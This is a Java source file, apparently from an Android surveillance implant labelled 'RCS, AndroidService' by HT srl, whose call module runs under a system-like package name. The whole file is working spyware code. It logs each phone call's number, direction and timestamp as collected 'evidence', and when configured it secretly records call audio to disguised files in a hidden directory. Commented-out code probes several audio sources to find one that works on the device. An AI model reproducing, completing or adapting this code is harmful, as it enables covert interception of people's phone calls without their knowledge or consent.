/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;

import android.media.MediaRecorder;
import android.os.Build;

import com.android.service.Call;
import com.android.service.LogR;
import com.android.service.Messages;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfigurationException;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.file.Path;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class ModuleCall extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	private MediaRecorder recorder = null;
	private boolean record;

	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				record = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				record = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);

		if (record) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
	}

	/*
	 * public int notification(Call call) { // Creare un dummy file per capire
	 * la strategia da usare /* if (record == false) { if (Cfg.DEBUG) {
	 * Check.log(TAG +
	 * " (notification): not recording call as per configuration");
	 * //$NON-NLS-1$ }
	 * 
	 * return 0; }
	 * 
	 * if (call.isOngoing() == false) { if (recorder == null) { if (Cfg.DEBUG) {
	 * Check.log(TAG + " (notification): recorder is already null");
	 * //$NON-NLS-1$ }
	 * 
	 * return 0; }
	 * 
	 * recorder.stop(); recorder.release(); recorder = null;
	 * 
	 * if (Cfg.DEBUG) { Check.log(TAG + " (notification): call is finished");
	 * //$NON-NLS-1$ }
	 * 
	 * return 0; }
	 * 
	 * recorder = new MediaRecorder();
	 * 
	 * String path = Environment.getExternalStorageDirectory().getAbsolutePath()
	 * + "/records/test3.3gp";
	 * 
	 * if (Cfg.DEBUG) { Check.log(TAG + " (notification): " + path);
	 * //$NON-NLS-1$ }
	 * 
	 * File directory = new File(path).getParentFile();
	 * 
	 * if (!directory.exists() && !directory.mkdirs()) { return 0; }
	 * 
	 * //recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
	 * recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
	 * recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	 * recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	 * recorder.setOutputFile(path);
	 * 
	 * try { recorder.prepare(); } catch (Exception e) { if (Cfg.EXCEPTION) {
	 * Check.log(e); } }
	 * 
	 * recorder.start();
	 * 
	 * if (Cfg.DEBUG) { Check.log(TAG + " (notification): recording call...");
	 * //$NON-NLS-1$ }
	 * 
	 * return 0; }
	 */

	public int notification(Call call) {
		final String name = ""; //$NON-NLS-1$
		final boolean missed = false;
		final String nametype = Messages.getString("7.0"); //$NON-NLS-1$
		final String note = Messages.getString("7.1"); //$NON-NLS-1$

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
		}

		if (call.isComplete() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
			}

			return 0;
		}

		final boolean outgoing = !call.isIncoming();
		final int duration = call.getDuration(call);
		final int LOG_CALLIST_VERSION = 0;

		int len = 28; // 0x1C;

		final String number = call.getNumber();
		len += wsize(number);
		len += wsize(name);
		len += wsize(note);
		len += wsize(nametype);

		final byte[] data = new byte[len];

		final DataBuffer databuffer = new DataBuffer(data, 0, len);

		final DateTime from = new DateTime(call.getTimestamp());
		final DateTime to = new DateTime(call.getTimestamp());

		databuffer.writeInt(len);
		databuffer.writeInt(LOG_CALLIST_VERSION);
		databuffer.writeLong(from.getFiledate());
		databuffer.writeLong(to.getFiledate());

		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
		databuffer.writeInt(flags);

		addTypedString(databuffer, (byte) 0x01, name);
		addTypedString(databuffer, (byte) 0x02, nametype);
		addTypedString(databuffer, (byte) 0x04, note);
		addTypedString(databuffer, (byte) 0x08, number);

		new LogR(EvidenceType.CALLLIST, null, data);

		// Let's start with call recording
		if (record && isSupported()) {
			if (call.isOngoing() == false) {
				stopRecord();

				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
				}
				
				return 0;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
			}
			
			int strategy = getStrategy();

			if (strategy == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): no valid strategy found"); //$NON-NLS-1$
				}

				return 0;
			}

			int outputFormat = MediaRecorder.OutputFormat.THREE_GPP;
			int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;

			// TODO implementare il logging vero
			//String path = Path.hidden() + "quetest.3gpp";
			Long ts = new Long(System.currentTimeMillis());
			String tmp = ts.toString();
			String path = Path.hidden() + "/" + tmp + ".qzt"; // Logfile .3gpp in chiaro, temporaneo

			if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
				}
				
				return 1;
			}
		}

		return 0;
	}

	private boolean isSupported() {
		String model = Build.MODEL.toLowerCase();
		boolean supported = false;
		
		if (model.contains("i9100")) {
			supported = true;
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model supported by call registration module"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
			}
		}
		
		return supported;
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name, false));
		}
	}

	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
		recorder = new MediaRecorder();

		recorder.setAudioSource(audioSource);
		recorder.setOutputFormat(outputFormat);
		recorder.setAudioEncoder(audioEncoder);
		recorder.setOutputFile(path);

		try {
			recorder.prepare();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		recorder.start();
		return true;
	}

	private void stopRecord() {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}

			return;
		}

		recorder.stop();
		recorder.release();
		recorder = null;
	}

	// Must be called only when a call is in progress
	@SuppressWarnings("unchecked")
	private int getStrategy() {
		// Return temporaneo per ISS, funziona solo con Samsung Galaxy S2
		// TODO rimuovere
		return MediaRecorder.AudioSource.VOICE_UPLINK;
					
					
/*		Markup markupCallStrategy = new Markup(this);
		HashMap<Integer, Boolean> strategyMap = null;

		// the markup exists, try to read it
		try {		
			if (markupCallStrategy.isMarkup()) {
				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
			}

			// First time we run, let's try a strategy
			if (strategyMap == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
				}
				
				// Start with strategy 1
				int outputFormat = MediaRecorder.OutputFormat.THREE_GPP;
				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
				boolean res;
				
				strategyMap = new HashMap<Integer, Boolean>();

				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);

				// Strategy 0x04
				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
				}
				
				if (res == true) {	
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_CALL;
				}
				
				// Strategy 0x02
				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
				}
				
				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_UPLINK;
				}

				// Strategy 0x03
				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
				}
				
				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
				}

				// Strategy 0x01
				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
				}
				
				strategyMap.put(MediaRecorder.AudioSource.MIC, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.MIC;
				}

				markupCallStrategy.writeMarkupSerializable(strategyMap);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
				}
			} else { // Return the winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
				}
				
				for (Integer i : strategyMap.keySet()) {
				    boolean testedStrategy = strategyMap.get(i);
				
				    if (testedStrategy == true) {
				    	// Return the winning strategy
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
						}
						
				    	return i;
				    }
				}
				
				// Ok we don't have a winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
				}
				
				return 0;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
			}
		}
		
		return 0;*/
	}

	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
		// Create dummy file
		Long ts = new Long(System.currentTimeMillis());
		String tmp = ts.toString();
		String path = Path.hidden() + "/" + tmp + ".qzt"; // file .3gp
		boolean success = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
		}

		startRecord(audioSource, outputFormat, audioEncoder, path);

		//Utils.sleep(250);

		stopRecord();

		File dummy = new File(path);

		if (dummy.length() > 0) {
			success = true;
		}

		dummy.delete();
		dummy = null;

		return success;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}
}
